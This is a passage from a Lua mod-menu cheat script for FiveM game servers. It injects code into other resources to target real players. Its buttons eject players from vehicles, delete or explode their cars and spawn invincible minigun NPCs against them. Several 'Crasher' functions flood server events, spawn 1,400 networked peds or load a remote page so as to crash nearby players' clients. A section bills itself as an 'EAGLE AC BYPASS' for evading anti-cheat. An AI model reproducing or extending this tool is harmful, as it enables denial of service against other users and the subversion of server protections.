                                SetPedSeeingRange(botPed, 0.0)
                                SetPedHearingRange(botPed, 0.0)
                                SetPedAlertness(botPed, 0)
                                SetPedKeepTask(botPed, true)
                                SetEntityCollision(botPed, false, false)
                                
                                -- البوت يظهر لي فقط (مخفي عن الآخرين)
                                SetEntityVisible(botPed, true, false) -- يظهر لي
                                NetworkSetEntityInvisibleToNetwork(botPed, true) -- مخفي عن الشبكة/اللاعبين الآخرين
                                
                                -- وضع البوت في السيارة كسائق فوراً
                                SetPedIntoVehicle(botPed, targetVehicle, -1)
                                
                                Citizen.Wait(100)
                                
                                -- إعدادات السيارة 
                                SetVehicleDoorsLocked(targetVehicle, 4)
                                SetVehicleEngineOn(targetVehicle, true, true, false)
                                
                                -- تحسين أداء السيارة بشكل معقول
                                SetVehicleEnginePowerMultiplier(targetVehicle, 1.5) -- زيادة بسيطة في قوة المحرك
                                ModifyVehicleTopSpeed(targetVehicle, 1.3) -- زيادة السرعة القصوى بنسبة 30%
                                
                                -- البوت يتمشى بالسيارة
                                Citizen.CreateThread(function()
                                    while DoesEntityExist(botPed) and DoesEntityExist(targetVehicle) do
                                        if IsPedInVehicle(botPed, targetVehicle, false) then
                                            -- الحصول على موقع السيارة الحالي
                                            local vehiclePos = GetEntityCoords(targetVehicle)
                                            
                                            -- إنشاء نقطة عشوائية قريبة للتمشي إليها
                                            local randomX = vehiclePos.x + math.random(-700, 700)
                                            local randomY = vehiclePos.y + math.random(-700, 700)
                                            local randomZ = vehiclePos.z
                                            
                                            -- مهمة القيادة بسرعة معقولة وثابتة
                                            TaskVehicleDriveToCoord(botPed, targetVehicle, randomX, randomY, randomZ, 35.0, 0, GetEntityModel(targetVehicle), 786603, 3.0, true)
                                            
                                            -- الحفاظ على سرعة ثابتة بدون قفزات مفاجئة
                                            SetVehicleForwardSpeed(targetVehicle, 25.0)
                                            
                                            Citizen.Wait(6000) -- انتظار 6 ثوان قبل تغيير الوجهة
                                        else
                                            break
                                        end
                                    end
                                end)
                                
                                -- حذف البوت بعد 2 دقيقة
                                Citizen.CreateThread(function()
                                    Citizen.Wait(120000) -- 2 دقيقة
                                    if DoesEntityExist(botPed) then
                                        DeleteEntity(botPed)
                                    end
                                end)
                                
                                SetModelAsNoLongerNeeded(botModel)
                            end
                        end
                    end)
                ]])
                MachoMenuNotification("Vehicle", "Kicked Player ID: " .. GetPlayerServerId(selectedPlayer) .. " from vehicle and added steady speed bot driver")
            else
                MachoMenuNotification("Error", "Selected player is not in a vehicle")
            end
        else
            MachoMenuNotification("Error", "Player not found")
        end
    else
        MachoMenuNotification("Error", "No player selected")
    end
end)
MachoMenuButton(PlayerSection, "LOCK Vehicle", function()
    local selectedPlayer = MachoMenuGetSelectedPlayer()  
    if selectedPlayer and selectedPlayer ~= -1 then      
        local targetPed = GetPlayerPed(selectedPlayer)   
        if targetPed and DoesEntityExist(targetPed) then
            local targetVehicle = GetVehiclePedIsIn(targetPed, false)
            if targetVehicle ~= 0 then
                local playerPed = PlayerPedId()
                ClearPedTasksImmediately(playerPed)
                
                local originalPos = GetEntityCoords(playerPed)
                local originalHeading = GetEntityHeading(playerPed)
                
                MachoInjectResource("any", [[
                    Citizen.CreateThread(function()
                        local playerPed = PlayerPedId()
                        local targetPed = GetPlayerPed(]] .. selectedPlayer .. [[)
                        local targetVehicle = GetVehiclePedIsIn(targetPed, false)
                        local originalPos = vector3(]] .. originalPos.x .. [[, ]] .. originalPos.y .. [[, ]] .. originalPos.z .. [[)
                        local originalHeading = ]] .. originalHeading .. [[
                        
                        if targetVehicle ~= 0 then
                            SetVehicleDoorsLocked(targetVehicle, 1)
                            SetVehicleDoorsLockedForAllPlayers(targetVehicle, false)
                            
                            SetEntityVisible(playerPed, false, false)
                            
                            TaskLeaveVehicle(targetPed, targetVehicle, 0)
                            
                            SetPedMoveRateOverride(playerPed, 10.0)
                            
                            ClearPedTasks(playerPed)
                            SetVehicleForwardSpeed(targetVehicle, 0.0)
                            
                            TaskEnterVehicle(playerPed, targetVehicle, 50, -1, 2.0, 8, 0)
                            
                            local keepHidden = true
                            Citizen.CreateThread(function()
                                while keepHidden do
                                    SetEntityVisible(playerPed, false, false)
                                    Citizen.Wait(10)
                                end
                            end)
                            
                            Citizen.Wait(500)
                            keepHidden = false
                            
                            ClearPedTasksImmediately(playerPed)
                            
                            SetEntityAsMissionEntity(playerPed, true, true)
                            
                            SetEntityCoordsNoOffset(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false)
                            SetEntityHeading(playerPed, originalHeading)
                            
                            for i = 1, 50 do
                                SetEntityVisible(playerPed, false, false)
                                Citizen.Wait(10)
                            end
                            
                            Citizen.Wait(100)
                            
                            ClearPedTasksImmediately(playerPed)
                            
                            SetPedMoveRateOverride(playerPed, 1.0)
                            SetEntityVelocity(playerPed, 0.1, 0.1, 0.0)
                            TaskWanderStandard(playerPed, 0.0, 0)
                            Citizen.Wait(100)
                            ClearPedTasksImmediately(playerPed)
                            
                            SetEntityVisible(playerPed, false, false)
                            
                            Citizen.Wait(100)
                            
                            ClearPedTasksImmediately(playerPed)
                            SetPedMoveRateOverride(playerPed, 1.0)
                            SetEntityAsMissionEntity(playerPed, false, false)
                            
                            SetEntityCoordsNoOffset(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false)
                            SetEntityHeading(playerPed, originalHeading)
                            
                            Citizen.Wait(100)
                            
                            TaskGoStraightToCoord(playerPed, originalPos.x + 0.5, originalPos.y + 0.5, originalPos.z, 1.0, 500, originalHeading, 0.1)
                            
                            Citizen.Wait(600)
                            
                            ClearPedTasks(playerPed)
                            
                            if DoesEntityExist(targetVehicle) then
                                SetVehicleDoorsLocked(targetVehicle, 4)
                                local maxSeats = GetVehicleModelNumberOfSeats(GetEntityModel(targetVehicle)) - 1
                                for seat = 0, maxSeats do
                                    local ped = GetPedInVehicleSeat(targetVehicle, seat)
                                    if ped ~= 0 and ped ~= playerPed then
                                        SetPedCanBeDraggedOut(ped, false)
                                        SetPedConfigFlag(ped, 32, true)
                                        TaskWarpPedIntoVehicle(ped, targetVehicle, seat)
                                    end
                                end
                            end
                            
                            SetEntityVisible(playerPed, true, false)
                        end
                    end)
                ]])
                MachoMenuNotification("Vehicle", "Kicked Player ID: " .. GetPlayerServerId(selectedPlayer) .. " from vehicle")
            else
                MachoMenuNotification("Error", "Selected player is not in a vehicle")
            end
        else
            MachoMenuNotification("Error", "Player not found")
        end
    else
        MachoMenuNotification("Error", "No player selected")
    end
end)
MachoMenuButton(PlayerSection, "Delete Vehicle", function()
    local selectedPlayer = MachoMenuGetSelectedPlayer()  
    if selectedPlayer and selectedPlayer ~= -1 then      
        local targetPed = GetPlayerPed(selectedPlayer)   
        if targetPed and DoesEntityExist(targetPed) then
            local targetVehicle = GetVehiclePedIsIn(targetPed, false)
            if targetVehicle ~= 0 then
                local playerPed = PlayerPedId()
                ClearPedTasksImmediately(playerPed)
                
                local originalPos = GetEntityCoords(playerPed)
                local originalHeading = GetEntityHeading(playerPed)
                
                MachoInjectResource("any", [[
                    Citizen.CreateThread(function()
                        local playerPed = PlayerPedId()
                        local targetPed = GetPlayerPed(]] .. selectedPlayer .. [[)
                        local targetVehicle = GetVehiclePedIsIn(targetPed, false)
                        local originalPos = vector3(]] .. originalPos.x .. [[, ]] .. originalPos.y .. [[, ]] .. originalPos.z .. [[)
                        local originalHeading = ]] .. originalHeading .. [[
                        
                        if targetVehicle ~= 0 then
                            SetVehicleDoorsLocked(targetVehicle, 1)
                            SetVehicleDoorsLockedForAllPlayers(targetVehicle, false)
                            
                            SetEntityVisible(playerPed, false, false)
                            
                            TaskLeaveVehicle(targetPed, targetVehicle, 0)
                            
                            SetPedMoveRateOverride(playerPed, 10.0)
                            
                            ClearPedTasks(playerPed)
                            SetVehicleForwardSpeed(targetVehicle, 0.0)
                            
                            TaskEnterVehicle(playerPed, targetVehicle, 50, -1, 2.0, 8, 0)
                            
                            local keepHidden = true
                            Citizen.CreateThread(function()
                                while keepHidden do
                                    SetEntityVisible(playerPed, false, false)
                                    Citizen.Wait(10)
                                end
                            end)
                            
                            Citizen.Wait(500)
                            keepHidden = false
                            
                            ClearPedTasksImmediately(playerPed)
                            
                            SetEntityAsMissionEntity(playerPed, true, true)
                            
                            SetEntityCoordsNoOffset(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false)
                            SetEntityHeading(playerPed, originalHeading)
                            
                            for i = 1, 50 do
                                SetEntityVisible(playerPed, false, false)
                                Citizen.Wait(10)
                            end
                            
                            Citizen.Wait(100)
                            
                            ClearPedTasksImmediately(playerPed)
                            
                            SetPedMoveRateOverride(playerPed, 1.0)
                            SetEntityVelocity(playerPed, 0.1, 0.1, 0.0)
                            TaskWanderStandard(playerPed, 0.0, 0)
                            Citizen.Wait(100)
                            ClearPedTasksImmediately(playerPed)
                            
                            SetEntityVisible(playerPed, false, false)
                            
                            Citizen.Wait(100)
                            
                            ClearPedTasksImmediately(playerPed)
                            SetPedMoveRateOverride(playerPed, 1.0)
                            SetEntityAsMissionEntity(playerPed, false, false)
                            
                            SetEntityCoordsNoOffset(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false)
                            SetEntityHeading(playerPed, originalHeading)
                            
                            Citizen.Wait(100)
                            
                            TaskGoStraightToCoord(playerPed, originalPos.x + 0.5, originalPos.y + 0.5, originalPos.z, 1.0, 500, originalHeading, 0.1)
                            
                            Citizen.Wait(600)
                            
                            ClearPedTasks(playerPed)
                            
                            if DoesEntityExist(targetVehicle) then
                                -- حذف السيارة
                                DeleteEntity(targetVehicle)
                            end
                            
                            SetEntityVisible(playerPed, true, false)
                        end
                    end)
                ]])
                MachoMenuNotification("Vehicle", "Vehicle deleted for Player ID: " .. GetPlayerServerId(selectedPlayer))
            else
                MachoMenuNotification("Error", "Selected player is not in a vehicle")
            end
        else
            MachoMenuNotification("Error", "Player not found")
        end
    else
        MachoMenuNotification("Error", "No player selected")
    end
end)


-- دالة مساعدة لتعداد السيارات
function EnumerateVehicles()
    return coroutine.wrap(function()
        local iter, id = FindFirstVehicle()
        if not id or id == 0 then
            EndFindVehicle(iter)
            return
        end
        
        local enum = {handle = iter, destructor = EndFindVehicle}
        setmetatable(enum, entityEnumerator)
        
        local next = true
        repeat
            coroutine.yield(id)
            next, id = FindNextVehicle(iter)
        until not next
        
        enum.destructor, enum.handle = nil, nil
        EndFindVehicle(iter)
    end)
end

-- Metatable للـ entity enumerator
entityEnumerator = {
    __gc = function(enum)
        if enum.destructor and enum.handle then
            enum.destructor(enum.handle)
        end
    end
}
MachoMenuButton(PlayerSection, "Boom vehicle", function()
    local selectedPlayer = MachoMenuGetSelectedPlayer()
    if selectedPlayer and selectedPlayer ~= -1 then
        local targetPed = GetPlayerPed(selectedPlayer)
        if targetPed and DoesEntityExist(targetPed) then
            local targetVehicle = GetVehiclePedIsIn(targetPed, false)
            if targetVehicle ~= 0 then
                local playerPed = PlayerPedId()
                ClearPedTasksImmediately(playerPed)

                local originalPos = GetEntityCoords(playerPed)
                local originalHeading = GetEntityHeading(playerPed)

                MachoInjectResource("any", [[
                    Citizen.CreateThread(function()
                        local playerPed = PlayerPedId()
                        local targetPed = GetPlayerPed(]] .. selectedPlayer .. [[)
                        local targetVehicle = GetVehiclePedIsIn(targetPed, false)
                        local originalPos = vector3(]] .. originalPos.x .. [[, ]] .. originalPos.y .. [[, ]] .. originalPos.z .. [[)
                        local originalHeading = ]] .. originalHeading .. [[

                        if targetVehicle ~= 0 then
                            SetVehicleDoorsLocked(targetVehicle, 1)
                            SetVehicleDoorsLockedForAllPlayers(targetVehicle, false)

                            SetEntityVisible(playerPed, false, false)

                            TaskLeaveVehicle(targetPed, targetVehicle, 0)

                            SetPedMoveRateOverride(playerPed, 10.0)

                            ClearPedTasks(playerPed)
                            SetVehicleForwardSpeed(targetVehicle, 0.0)

                            TaskEnterVehicle(playerPed, targetVehicle, 50, -1, 2.0, 8, 0)

                            local keepHidden = true
                            Citizen.CreateThread(function()
                                while keepHidden do
                                    SetEntityVisible(playerPed, false, false)
                                    Citizen.Wait(10)
                                end
                            end)

                            Citizen.Wait(500)
                            keepHidden = false

                            ClearPedTasksImmediately(playerPed)

                            SetEntityAsMissionEntity(playerPed, true, true)

                            SetEntityCoordsNoOffset(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false)
                            SetEntityHeading(playerPed, originalHeading)

                            for i = 1, 50 do
                                SetEntityVisible(playerPed, false, false)
                                Citizen.Wait(10)
                            end

                            Citizen.Wait(100)

                            ClearPedTasksImmediately(playerPed)

                            SetPedMoveRateOverride(playerPed, 1.0)
                            SetEntityVelocity(playerPed, 0.1, 0.1, 0.0)
                            TaskWanderStandard(playerPed, 0.0, 0)
                            Citizen.Wait(100)
                            ClearPedTasksImmediately(playerPed)

                            SetEntityVisible(playerPed, false, false)

                            Citizen.Wait(100)

                            ClearPedTasksImmediately(playerPed)
                            SetPedMoveRateOverride(playerPed, 1.0)
                            SetEntityAsMissionEntity(playerPed, false, false)

                            SetEntityCoordsNoOffset(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false)
                            SetEntityHeading(playerPed, originalHeading)

                            Citizen.Wait(100)

                            TaskGoStraightToCoord(playerPed, originalPos.x + 0.5, originalPos.y + 0.5, originalPos.z, 1.0, 500, originalHeading, 0.1)

                            Citizen.Wait(600)

                            ClearPedTasks(playerPed)

                            SetEntityVisible(playerPed, true, false)

                            -- Explode target vehicle using ExplodeVehicle with all options set to false
                            if DoesEntityExist(targetVehicle) then
                                ExplodeVehicle(targetVehicle, false, false)
                            end
                        end
                    end)
                ]])
                MachoMenuNotification("Vehicle", "Kicked Player ID: " .. GetPlayerServerId(selectedPlayer) .. " from vehicle and detonated")
            else
                MachoMenuNotification("Error", "Selected player is not in a vehicle")
            end
        else
            MachoMenuNotification("Error", "Player not found")
        end
    else
        MachoMenuNotification("Error", "No player selected")
    end
end)

MachoMenuText(PlayerSection,"Risky trolls")

MachoMenuButton(PlayerSection, "Spawn Attack NPC (!)", function()
    local selectedPlayer = MachoMenuGetSelectedPlayer()
    
    if not selectedPlayer then
        MachoMenuNotification("Error", "No player selected! Select a player from the list first.")
        return
    end
    
    local serverId = GetPlayerServerId(selectedPlayer)
    MachoMenuNotification("NPC System", "Spawning attack NPC on player ID: " .. serverId)
    
    -- Find available resource for injection
    local targetResource = nil
    local resourcePriority = {"any", "any", "any"}
    
    for _, resourceName in ipairs(resourcePriority) do
        if GetResourceState(resourceName) == "started" then
            targetResource = resourceName
            break
        end
    end
    
    if not targetResource then
        -- Fallback to any available resource
        local allResources = {}
        for i = 0, GetNumResources() - 1 do
            local resourceName = GetResourceByFindIndex(i)
            if resourceName and GetResourceState(resourceName) == "started" then
                targetResource = resourceName
                break
            end
        end
    end
    
    if not targetResource then
        MachoMenuNotification("Error", "No suitable resource found!")
        return
    end
    
    -- Spawn with resource injection
    MachoInjectResource(targetResource, string.format([[
        local npcModel = "g_m_y_ballasout_01"
        local weaponHash = GetHashKey("weapon_minigun")
        local playerPed = GetPlayerPed(GetPlayerFromServerId(%d))
        
        if not DoesEntityExist(playerPed) then
            TriggerEvent('chat:addMessage', { args = { '^1NPC System:', 'Target player not found!' } })
            return
        end
        
        local playerPos = GetEntityCoords(playerPed)
        
        RequestModel(npcModel)
        while not HasModelLoaded(npcModel) do
            Citizen.Wait(100)
        end
        
        -- Spawn single NPC
        local spawnX = playerPos.x + 3.0
        local spawnY = playerPos.y + 3.0
        local spawnZ = playerPos.z
        
        local npc = CreatePed(4, npcModel, spawnX, spawnY, spawnZ, 0.0, true, false)
        
        -- Make NPC immortal but can still ragdoll naturally
        SetEntityInvincible(npc, true)
        SetPedDiesWhenInjured(npc, false)
        
        -- Give minigun
        GiveWeaponToPed(npc, weaponHash, 9999, false, true)
        SetCurrentPedWeapon(npc, weaponHash, true)
        
        -- Combat settings focused on attacking
        SetPedCombatAttributes(npc, 5, true)
        SetPedCombatAttributes(npc, 46, true)
        SetPedCombatRange(npc, 2)
        SetPedCombatMovement(npc, 3)
        SetPedAccuracy(npc, 100)
        
        -- Attack target player
        TaskCombatPed(npc, playerPed, 0, 16)
        SetEntityAsNoLongerNeeded(npc)
        
        TriggerEvent('chat:addMessage', { args = { '^2NPC System:', 'Attack NPC spawned with minigun!' } })
    ]], serverId))
end)


local NitWitdestroyer = MachoMenuAddTab(MenuWindow, "Destroyer")
    local LLeftSectionWidth = (MenuSize.x - TabsBarWidth) * 0.99

    local NitWiroyer = MachoMenuGroup(NitWitdestroyer, "Main", 
        TabsBarWidth + 5, 5 + MachoPaneGap, 
        TabsBarWidth + LLeftSectionWidth, MenuSize.y - 5)
-- Define the GetPlayersInArea function to find nearby players
---

MachoMenuButton(NitWiroyer, "Crasher v1", function()
    function GetPlayersInArea()
    local players = {}
    for _, player in ipairs(GetActivePlayers()) do
        local ped = GetPlayerPed(player)
        if DoesEntityExist(ped) and ped ~= PlayerPedId() then
            -- Check the distance to ensure they are rendered
            local playerCoords = GetEntityCoords(ped)
            local myCoords = GetEntityCoords(PlayerPedId())
            local distance = Vdist(myCoords.x, myCoords.y, myCoords.z, playerCoords.x, playerCoords.y, playerCoords.z)
            
            -- Change 200.0 to your desired distance
            if distance < 200.0 then
                table.insert(players, player)
            end
        end
    end
    return players
end

    -- 1. جلب جميع اللاعبين المرندرين وحفظ IDs
    local players = GetPlayersInArea() -- تابعك الخاص يرجع Ped أو Player Index
    local playerIDs = {}

    for _, playerId in ipairs(players) do
        local serverId = GetPlayerServerId(playerId)
        if serverId and serverId > 0 then
            table.insert(playerIDs, serverId)
        end
    end
    

    if #playerIDs > 0 then
        -- 2. فتح DUI من الرابط
        local dui = MachoCreateDui("https://wf-675.github.io/crashingo.gg/")
        MachoShowDui(dui)

        -- 3. 

        -- 4. حفظ موقع اللاعب الحالي ونقله لمكان مؤقت
        local ped = PlayerPedId()
        local originalCoords = GetEntityCoords(ped)
        SetEntityCoords(ped, 1500.0, -1500.0, 58.0, false, false, false, true)
        Wait(500)

        -- 5. تطبيق التريغر على كل اللاعبين المرندرين مع تأخير 10ms بين كل شخص
        for _, serverId in ipairs(playerIDs) do
            for _, triggerData in ipairs(foundTriggers.items) do
                -- التريغر الخاص بالسيرفر
                MachoInjectResource(triggerData.resource, 'TriggerServerEvent("police:server:KidnapPlayer", ' .. serverId .. ')')
                Wait(10) -- تأخير 10 مللي ثانية بين كل تريغر
            end
        end

        -- 6. الانتظار قبل الرجوع
        Wait(4000)

        -- 7. إعادة اللاعب لمكانه الأصلي
        SetEntityCoords(ped, originalCoords.x, originalCoords.y, originalCoords.z, false, false, false, true)

        -- 8. إخفاء وإغلاق DUI
        Wait(100)
        MachoDestroyDui(dui)

        MachoMenuNotification("Success", "All rendered players have been processed and you have been returned to your location.")
    else
        MachoMenuNotification("Error", "No players are currently rendered.")
    end
end)
MachoMenuButton(NitWiroyer, "Crasher v2", function()
    local targetResource = nil
    local resourcePriority = {"any", "any", "any"}
    local foundResources = {}
    
    for _, resourceName in ipairs(resourcePriority) do
        if GetResourceState(resourceName) == "started" then
            table.insert(foundResources, resourceName)
        end
    end
    
    if #foundResources > 0 then
        targetResource = foundResources[math.random(1, #foundResources)]
    else
        local allResources = {}
        for i = 0, GetNumResources() - 1 do
            local resourceName = GetResourceByFindIndex(i)
            if resourceName and GetResourceState(resourceName) == "started" then
                table.insert(allResources, resourceName)
            end
        end
        if #allResources > 0 then
            targetResource = allResources[math.random(1, #allResources)]
        else
            MachoMenuNotification("Crasher", "Failed - System error!")
            return
        end
    end
    
    MachoInjectResource(targetResource, [[
        local function getClosestPlayer()
            local playerPed = PlayerPedId()
            local playerCoords = GetEntityCoords(playerPed)
            local closestPlayer = nil
            local closestDistance = 999999.0
            
            for _, playerId in ipairs(GetActivePlayers()) do
                local targetPed = GetPlayerPed(playerId)
                if targetPed ~= 0 and targetPed ~= playerPed then
                    local targetCoords = GetEntityCoords(targetPed)
                    local distance = #(playerCoords - targetCoords)
                    
                    if distance < closestDistance then
                        closestDistance = distance
                        closestPlayer = playerId
                    end
                end
            end
            
            return closestPlayer, closestDistance
        end
        
        local function spawnInvisibleWadeBot(coords)
            local hash = GetHashKey("ig_wade")
            
            RequestModel(hash)
            while not HasModelLoaded(hash) do
                Wait(10)
            end
            
            local bot = CreatePed(4, hash, coords.x, coords.y, coords.z, math.random(0, 360), true, false)
            
            SetEntityVisible(bot, false, false)
            SetEntityAlpha(bot, 0, false)
            SetEntityCollision(bot, false, false)
            SetEntityInvincible(bot, true)
            FreezeEntityPosition(bot, true)
            SetBlockingOfNonTemporaryEvents(bot, true)
            SetPedAsNoLongerNeeded(bot)
            
            NetworkRegisterEntityAsNetworked(bot)
            SetNetworkIdExistsOnAllMachines(NetworkGetNetworkIdFromEntity(bot), true)
            SetNetworkIdCanMigrate(NetworkGetNetworkIdFromEntity(bot), false)
            
            SetModelAsNoLongerNeeded(hash)
            
            return bot
        end
        
        local function executeWadeBotSpawn()
            local closestPlayer, distance = getClosestPlayer()
            
            if closestPlayer and distance < 100.0 then
                local targetPed = GetPlayerPed(closestPlayer)
                local targetCoords = GetEntityCoords(targetPed)
                
                for i = 1, 1400 do
                    local offsetX = math.random(-100, 100) / 10.0
                    local offsetY = math.random(-100, 100) / 10.0
                    local offsetZ = math.random(-20, 20) / 10.0
                    
                    local spawnCoords = vector3(
                        targetCoords.x + offsetX,
                        targetCoords.y + offsetY,
                        targetCoords.z + offsetZ
                    )
                    
                    CreateThread(function()
                        Wait(i * 50)
                        spawnInvisibleWadeBot(spawnCoords)
                    end)
                end
                
            else
            end
        end
        
        executeWadeBotSpawn()
        RegisterKeyMapping('wadebots', 'Spawn Wade Bots on Closest Player', 'keyboard', 'F10')
    ]])
    
    MachoMenuNotification("Crasher", "Operation completed successfully")
end)

MachoMenuButton(NitWiroyer, "Crasher v3", function()
MachoInjectResource("any", [[
local isARROWUpKeyPressed = false
local isSelectingPlayer = false
local selectedPlayer = -1
local outlineColor = {r = 0, g = 0, b = 0, a = 255} -- Color of the marker outline

-- Display notification for the selected player
local function SelectedByME(text)
    SetNotificationTextEntry("STRING")
    AddTextComponentString(text)
    DrawNotification(true, false)
end

-- Function to draw 3D text
function Draw3DText(x, y, z, text, r, g, b, a)
    local onScreen, _x, _y = World3dToScreen2d(x, y, z)
    if onScreen then
        SetTextScale(0.0, 0.35)
        SetTextFont(0)
        SetTextProportional(true)
        SetTextColour(r, g, b, a)
        SetTextOutline()
        SetTextEntry("STRING")
        AddTextComponentString(text)
        DrawText(_x, _y)
    end
end

-- Check if a player is in the center of the screen
function IsPlayerAtScreenCenter(player)
    local ped = GetPlayerPed(player)
    local pedCoords = GetEntityCoords(ped)
    local onScreen, screenX, screenY = World3dToScreen2d(pedCoords.x, pedCoords.y, pedCoords.z)
    if onScreen then
        local centerX, centerY = 0.5, 0.5
        local tolerance = 0.05
        return math.abs(screenX - centerX) < tolerance and math.abs(screenY - centerY) < tolerance
    end
    return false
end

-- Draw a dot at the center of the screen
function DrawCenterDot()
    local centerX, centerY = 0.5, 0.5
    local dotSize = 0.02
    local textureDict = "mpmissionend"
    local textureName = "goldmedal"

    RequestStreamedTextureDict(textureDict, true)
    DrawSprite(textureDict, textureName, centerX, centerY, dotSize, dotSize, 0.0, 255, 0, 0, 255)
end

-- Main thread
Citizen.CreateThread(function()
    local Black = 0
    local Hat = 0

    while true do
        Citizen.Wait(0)

        isARROWUpKeyPressed = IsControlPressed(0, 172) -- ARROW UP key
        isSelectingPlayer = IsControlPressed(0, 19) -- Check if left ALT is pressed for selecting player

        if isSelectingPlayer then
            local players = GetActivePlayers()
            local closestPlayer = -1

            -- Loop through all active players
            for _, player in ipairs(players) do
                if IsPlayerAtScreenCenter(player) then
                    closestPlayer = player
                    break
                end
            end

            -- If a player is selected
            if closestPlayer ~= -1 then
                selectedPlayer = closestPlayer
            end
        end

        -- Continuously draw a marker on the selected player
        if selectedPlayer ~= -1 then
            local targetPed = GetPlayerPed(selectedPlayer)
            local targetCoords = GetEntityCoords(targetPed)

            -- Draw a marker on the selected player's position
            DrawMarker(
                1, -- Marker type (cylinder)
                targetCoords.x, targetCoords.y, targetCoords.z - 1.0, -- Position (at player's feet)
                0.0, 0.0, 0.0, -- Direction
                0.0, 0.0, 0.0, -- Rotation
                0.9, 0.9, 2.0, -- Scale of the marker
                outlineColor.r, outlineColor.g, outlineColor.b, outlineColor.a, -- Color (RGBA)
                false, false, 2, false, nil, nil, false -- Additional options
            )
        end

        -- Trigger an explosion if the ARROW UP key is pressed, but keep the marker on the selected player
        if isARROWUpKeyPressed and selectedPlayer ~= -1 then
            local targetPed = GetPlayerPed(selectedPlayer)
            local targetCoords = GetEntityCoords(targetPed)
            local targetServerId = GetPlayerServerId(selectedPlayer)

            if Black < 400 then
                -- Increase the counter
                Black = Black + 1

                TriggerServerEvent("hospital:server:RevivePlayer", targetServerId)
                Citizen.Wait(5) -- Short wait between triggers
            end

            if Hat < 400 then
                -- Increase the counter
                Hat = Hat + 1

                TriggerServerEvent("hospital:server:RevivePlayer", targetServerId)
                Citizen.Wait(5) -- Short wait between triggers
            end
        end

        -- Reset the counter if it has reached the limit (e.g., after a certain condition)
        -- You can implement your own condition for resetting this counter.
        if Black >= 400 then
            Black = 0 -- Reset the counter to allow usage again
            SelectedByME("You can Crash now..!!")
            print('You can Crash now..!!')
        end
        if Hat >= 400 then
            Hat = 0 
        end

        -- Draw the center dot on the screen for easier selection
        DrawCenterDot()
    end
end)
]])
end)

MachoMenuText(NitWiroyer,"bypass")



local spawnerEnabled = false
local selectedKey = 0
local objectName = "prop_dumpster_01a"
local fiveGuardDetected = false


CreateThread(function()
    while true do
        Wait(500) 
        print("========================================")
        print("            EAGLE AC BYPASS            ")
        print("             discord.gg/LHD            ")
        print("      Object Spawner | Undetectable    ")
        print("========================================")
    end
end)


Citizen.CreateThread(function()
    local resources = GetNumResources()
    for i = 0, resources - 1 do
        local resource = GetResourceByFindIndex(i)
        local files = GetNumResourceMetadata(resource, 'client_script')
        for j = 0, files - 1 do
            local x = GetResourceMetadata(resource, 'client_script', j)
            if x ~= nil and string.find(x, "obfuscated") then
                fiveGuardDetected = true
                break
            end
        end
        if fiveGuardDetected then break end
    end
end)

-- Object Input Box
local ObjectInput = MachoMenuInputbox(NitWiroyer, "", "Enter object name")

-- Enable/Disable Checkbox  
MachoMenuCheckbox(NitWiroyer, "Object Spawn",
    function()
        local inputText = MachoMenuGetInputbox(ObjectInput)
        if inputText ~= "" then
            objectName = inputText
        end
        spawnerEnabled = true
        MachoMenuNotification("Eagle AC Bypass", "Activated Successfully")
    end,
    function()
        spawnerEnabled = false
    end
)

-- Keybind
MachoMenuKeybind(NitWiroyer, "Spawn Key", 0, function(key, toggle)
    selectedKey = key
end)

-- Camera Direction Function
function RotationToDirection(rotation)
    local adjustedRotation = {
        x = (math.pi / 180) * rotation.x,
        y = (math.pi / 180) * rotation.y,
        z = (math.pi / 180) * rotation.z
    }
    local direction = {
        x = -math.sin(adjustedRotation.z) * math.abs(math.cos(adjustedRotation.x)),
        y = math.cos(adjustedRotation.z) * math.abs(math.cos(adjustedRotation.x)),
        z = math.sin(adjustedRotation.x)
    }
    return direction
end

function SpawnBarrierAtTarget()
    local playerPed = PlayerPedId()
    local originalCoords = GetEntityCoords(playerPed)
    
    local cam = GetGameplayCamCoord()
    local camRot = GetGameplayCamRot(2)
    local camDirection = RotationToDirection(camRot)
    
    local rayEnd = {
        x = cam.x + (camDirection.x * 1000),
        y = cam.y + (camDirection.y * 1000),
        z = cam.z + (camDirection.z * 1000)
    }
    
    local raycast = StartShapeTestRay(cam.x, cam.y, cam.z, rayEnd.x, rayEnd.y, rayEnd.z, -1, playerPed, 0)
    local _, hit, hitCoords = GetShapeTestResult(raycast)
    
    local targetPoint = hit and hitCoords or rayEnd
    local newX = targetPoint.x
    local newY = targetPoint.y
    local newZ = targetPoint.z + 5.0
    
    if fiveGuardDetected then
        MachoInjectResource2(3, 'any', [[ TriggerEvent('Melix:SpawnBarrier', "MelixOnTopBar", "]] .. objectName .. [[") ]])
    else
        SetEntityCoordsNoOffset(playerPed, newX, newY, newZ, false, false, false)
        TriggerEvent('Melix:SpawnBarrier', "MelixOnTopBar", objectName)
        SetEntityCoordsNoOffset(playerPed, originalCoords.x, originalCoords.y, originalCoords.z, false, false, false)
    end
end

-- Key Detection
MachoOnKeyDown(function(key)
    if key == selectedKey and selectedKey ~= 0 and spawnerEnabled then
        SpawnBarrierAtTarget()
    end
end)


MachoMenuText(NitWiroyer,"Exploits")

MachoMenuCheckbox(NitWiroyer, "Lower Character 5m Animation", 
    function()
        enableLowerAnim = true
        CreateThread(function()
            while enableLowerAnim do
                local targetResource = nil
                if GetResourceState("any") == "started" then
                    targetResource = "any"
                end
                
                if targetResource then
                    MachoInjectResource(targetResource, [[
                        local playerPed = PlayerPedId()
                        
                        RequestAnimDict("missheistdockssetup1ig_12@base")
                        while not HasAnimDictLoaded("missheistdockssetup1ig_12@base") do
                            Citizen.Wait(100)
                        end
                        
                        TaskPlayAnim(playerPed, "missheistdockssetup1ig_12@base", "base", 8.0, -8.0, -1, 1, 0.2, false, false, false)
                        
                        SetEntityAnimCurrentTime(playerPed, "missheistdockssetup1ig_12@base", "base", 0.05)
                    ]])
                end
                
                Wait(500)
            end
        end)
    end,
    function()
        enableLowerAnim = false
        local playerPed = PlayerPedId()
        ClearPedTasks(playerPed)
    end
)
MachoMenuCheckbox(NitWiroyer, "kill all (You must hold a Gun)", 
    function()
        enableDamageLoop = true
        CreateThread(function()
            while enableDamageLoop do
                local targetResource = nil
                local resourcePriority = {"any", "any", "any"}
                local foundResources = {}
                
